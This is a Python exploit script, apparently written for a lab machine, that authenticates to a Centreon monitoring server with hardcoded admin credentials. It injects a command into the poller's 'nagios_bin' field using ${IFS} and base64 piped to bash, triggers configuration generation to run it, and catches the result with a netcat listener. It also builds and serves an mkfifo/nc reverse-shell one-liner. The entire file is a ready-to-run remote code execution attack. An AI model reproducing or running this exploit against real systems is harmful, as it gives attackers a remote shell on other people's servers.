#!/usr/bin/python
#usage python2 ./script.py IPADDRESS PORT
#Also be sure to include your decoded reverse tcp payload into your nagios_bin payload

import requests
import sys, os , signal, subprocess
import warnings
from bs4 import BeautifulSoup
import thread,random,string, time

def randomString(stringLength=10):
    """Generate a random string of fixed length """
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

# turn off BeautifulSoup warnings
warnings.filterwarnings("ignore", category=UserWarning, module='bs4')

if len(sys.argv) < 3:
    print(len(sys.argv))
    print("[~] Usage : ./script.py local_ip local_port")
    exit()

url = 'http://10.10.10.157/centreon'
username = 'admin'
password = 'password1'
localIP =  sys.argv[1]
localPort = sys.argv[2] 


# ------- write to payload--------
fileName = 'localPayload.txt'
localPayload  = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc '+localIP+ ' ' +localPort+' >/tmp/f' 
f= open(fileName,"w+")
f.write(localPayload)
f.close()

serverProcess = subprocess.Popen('python -m SimpleHTTPServer 8888'.split(' '), stdout=subprocess.PIPE,shell=False, preexec_fn=os.setsid)
request = requests.session()
print("[+] Retrieving CSRF token to submit the login form")
page = request.get(url+"/index.php")
html_content = page.text
soup = BeautifulSoup(html_content,features="lxml")
token = soup.findAll('input')[3].get("value")

login_info = {
    "useralias": username,
    "password": password,
    "submitLogin": "Connect",
    "centreon_token": token
}
login_request = request.post(url+"/index.php", login_info)
print("[+] Login token is : {0}".format(token))
if "Your credentials are incorrect." not in login_request.text:
    print("[+] Logged In Sucssfully")
    print("[+] Retrieving Poller token")

    poller_configuration_page = url + "/main.get.php?p=60901"
    get_poller_token = request.get(poller_configuration_page)
    poller_html = get_poller_token.text
    poller_soup = BeautifulSoup(poller_html,features="lxml")
    poller_token = ''
    poller_token_array= poller_soup.findAll('input')
    b = True
    #print poller_token_array
    for x in poller_token_array:
        if x.get("name") == 'centreon_token' and b:
            poller_token = x.get("value")
            b = False
    print("[+] Poller token is : {0}".format(poller_token))

    payload_info = {
        "name": "Central",
        "ns_ip_address": "127.0.0.1",
        # this value should be 1 always
        "localhost[localhost]": "1",
        "is_default[is_default]": "0",
        "remote_id": "",
        "ssh_port": "22",
        "init_script": "centengine",
        # this value contains the payload , you can change it as you want
        #---------------------------------------------------------------------
        "nagios_bin": "echo${IFS}<---INSERT YOUR BASH REVERSE TCP HERE---->${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash;",
        #---------------------------------------------------------------------
        "nagiostats_bin": "/usr/sbin/centenginestats",
        "nagios_perfdata": "/var/log/centreon-engine/service-perfdata",
        "centreonbroker_cfg_path": "/etc/centreon-broker",
        "centreonbroker_module_path": "/usr/share/centreon/lib/centreon-broker",
        "centreonbroker_logs_path": "",
        "centreonconnector_path": "/usr/lib64/centreon-connector",
        "init_script_centreontrapd": "centreontrapd",
        "snmp_trapd_path_conf": "/etc/snmp/centreon_traps/",
        "ns_activate[ns_activate]": "1",
        "submitC": "Save",
        "id": "1",
        "o": "c",
        "centreon_token": poller_token,
    }

    send_payload = request.post(poller_configuration_page, payload_info)
    print("[+] Injecting Done, triggering the payload")
    print("[+] Check your netcat listener !")
    generate_xml_page = url + "/include/configuration/configGenerate/xml/generateFiles.php"
    xml_page_data = {
        "poller": "1",
        "debug": "true",
        "generate": "true"
    }
    def post1( arg1 , arg2):
        request.post(arg1, arg2)
    def stopServer( func ):
        time.sleep(10) 
        func.kill()
    try:
        from threading import Thread
        
        Thread(target=post1, args=(generate_xml_page, xml_page_data )).start()
        Thread(target=stopServer, args=( serverProcess, )).start()

        print "\n\n------------------ shell listening ....... -----------"
        os.system('nc -nlvp '+localPort)
        #shell = subprocess.Popen(["nc", "-nlvp", localPort], shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)

    except Exception as e: 
        print e
    
    
else:
    print("[-] Wrong credentials")
    exit()
